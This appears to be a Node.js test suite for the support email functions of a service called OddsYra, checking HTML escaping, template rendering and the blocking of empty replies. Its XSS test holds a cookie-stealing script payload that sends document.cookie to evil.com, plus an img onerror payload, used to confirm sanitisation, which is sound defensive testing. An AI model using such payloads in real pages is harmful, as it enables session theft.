import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import {
  sendSupportAdminReplyEmail,
  sendSupportTicketCreatedUserEmail,
  sendSupportTicketClosedEmail,
  formatMessageForEmail,
  escapeHtml,
} from '../../server/auth/emailService.js';
import { emailUserOnAdminReply } from '../../lib/supportNotify.mjs';

describe('ODDSYRA — SUPPORT EMAIL MESSAGE CONTENT & TEMPLATE TESTS', () => {
  const testEmail = 'uday@example.com';
  const testName = 'Uday';
  const testTicketId = 'TICK-20260830-492';
  const multiLineReply = `Hello Uday,

We have checked your support request successfully.

Please let us know if you need any further assistance.

Regards,
OddsYra Support`;

  test('1. formatMessageForEmail escapes HTML and preserves line breaks as <br>', () => {
    const raw = `Line 1 <script>alert(1)</script>\nLine 2 & "quoted"\r\nLine 3`;
    const formatted = formatMessageForEmail(raw);

    assert.ok(formatted.includes('Line 1 &lt;script&gt;alert(1)&lt;/script&gt;'));
    assert.ok(formatted.includes('<br>Line 2 &amp; &quot;quoted&quot;<br>Line 3'));
    assert.ok(!formatted.includes('<script>'));
  });

  test('2. sendSupportAdminReplyEmail renders complete agent reply text inside the email template', async () => {
    const res = await sendSupportAdminReplyEmail({
      email: testEmail,
      name: testName,
      ticketId: testTicketId,
      agentReply: multiLineReply,
    });

    assert.equal(res.success, true, 'Email dispatch should succeed in test transport');
    assert.ok(res.html, 'Rendered HTML must be returned');

    // Header & greeting
    assert.ok(res.html.includes('New Reply from OddsYra Support'));
    assert.ok(res.html.includes(`Hi ${testName}`));
    assert.ok(res.html.includes(testTicketId));

    // Message box content
    assert.ok(res.html.includes('Hello Uday,<br><br>We have checked your support request successfully.'));
    assert.ok(res.html.includes('Please let us know if you need any further assistance.'));
    assert.ok(res.html.includes('OddsYra Support'));
    assert.ok(res.html.includes('white-space:pre-wrap'));
  });

  test('3. sendSupportAdminReplyEmail works with alternative field aliases (messageText, content, preview)', async () => {
    const textMsg = 'Testing messageText alias delivery.';
    const res1 = await sendSupportAdminReplyEmail({
      email: testEmail,
      name: testName,
      ticketNumber: testTicketId,
      messageText: textMsg,
    });
    assert.equal(res1.success, true);
    assert.ok(res1.html.includes(textMsg));

    const contentMsg = 'Testing content alias delivery.';
    const res2 = await sendSupportAdminReplyEmail({
      email: testEmail,
      name: testName,
      ticketId: testTicketId,
      content: contentMsg,
    });
    assert.equal(res2.success, true);
    assert.ok(res2.html.includes(contentMsg));
  });

  test('4. sendSupportAdminReplyEmail BLOCKS empty or whitespace replies (never sends blank emails)', async () => {
    const emptyRes = await sendSupportAdminReplyEmail({
      email: testEmail,
      name: testName,
      ticketId: testTicketId,
      agentReply: '   ',
    });

    assert.equal(emptyRes.success, false);
    assert.equal(emptyRes.skipped, true);
    assert.equal(emptyRes.reason, 'EMPTY_AGENT_REPLY_CONTENT');

    const nullRes = await sendSupportAdminReplyEmail({
      email: testEmail,
      name: testName,
      ticketId: testTicketId,
      agentReply: null,
    });

    assert.equal(nullRes.success, false);
    assert.equal(nullRes.skipped, true);
    assert.equal(nullRes.reason, 'EMPTY_AGENT_REPLY_CONTENT');
  });

  test('5. emailUserOnAdminReply safely resolves user contact and dispatches full reply', async () => {
    const res = await emailUserOnAdminReply({
      userId: 'usr_test_123',
      userEmail: testEmail,
      userName: testName,
      ticketNumber: testTicketId,
      agentReply: multiLineReply,
    });

    assert.equal(res.success, true);
    assert.ok(res.html);
    assert.ok(res.html.includes('We have checked your support request successfully.'));
  });

  test('6. XSS Prevention: Dangerous script injection is sanitized before email rendering', async () => {
    const maliciousReply = `Hello <script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script> <img src=x onerror=alert(1)>`;
    const res = await sendSupportAdminReplyEmail({
      email: testEmail,
      name: testName,
      ticketId: testTicketId,
      agentReply: maliciousReply,
    });

    assert.equal(res.success, true);
    assert.ok(!res.html.includes('<script>'));
    assert.ok(!res.html.includes('onerror='));
    assert.ok(res.html.includes('&lt;script&gt;'));
    assert.ok(res.html.includes('&lt;img src=x onerror=alert(1)&gt;'));
  });
});
